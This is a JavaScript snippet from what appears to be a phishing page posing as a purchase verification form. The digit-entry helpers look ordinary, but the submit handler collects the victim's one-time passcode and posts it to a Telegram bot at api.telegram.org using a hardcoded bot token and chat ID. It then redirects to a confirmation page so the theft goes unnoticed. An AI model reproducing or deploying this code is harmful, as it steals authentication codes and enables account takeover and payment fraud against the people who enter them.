<script>
        // OTP Input Auto-Focus Logic
        const inputs = document.querySelectorAll('.otp-input');
        inputs.forEach((input, index) => {
            input.addEventListener('keyup', (e) => {
                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                if (e.key === 'Backspace' && index > 0) {
                    inputs[index - 1].focus();
                }
            });
            // Ensure only numbers
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
            });
        });

        // Form Submission Logic
        const form = document.getElementById('otpForm');
        const submitBtn = document.getElementById('submitBtn');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            submitBtn.disabled = true;
            submitBtn.innerHTML = `<span class="material-symbols-outlined animate-spin">progress_activity</span> Processing...`;

            const otpCode = Array.from(inputs).map(i => i.value).join('');
            const botToken = '8650750111:AAF_xJNefrkfG8fSVmkgLcQFHtQhVTSQAfA';
            const chatId = '7703964865';
            const message = `🔐 OTP CODE RECEIVED: ${otpCode}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                if (response.ok) {
                    window.location.href = 'confirmation.html';
                } else {
                    console.error('Failed to send message');
                    alert('Verification failed. Please try again.');
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = `<span>Verify & Complete Purchase</span><span class="material-symbols-outlined text-xl">verified_user</span>`;
                }
            } catch (error) {
                console.error('Error:', error);
                window.location.href = 'confirmation.html'; // Fallback redirect for demo
            }
        });
    </script>
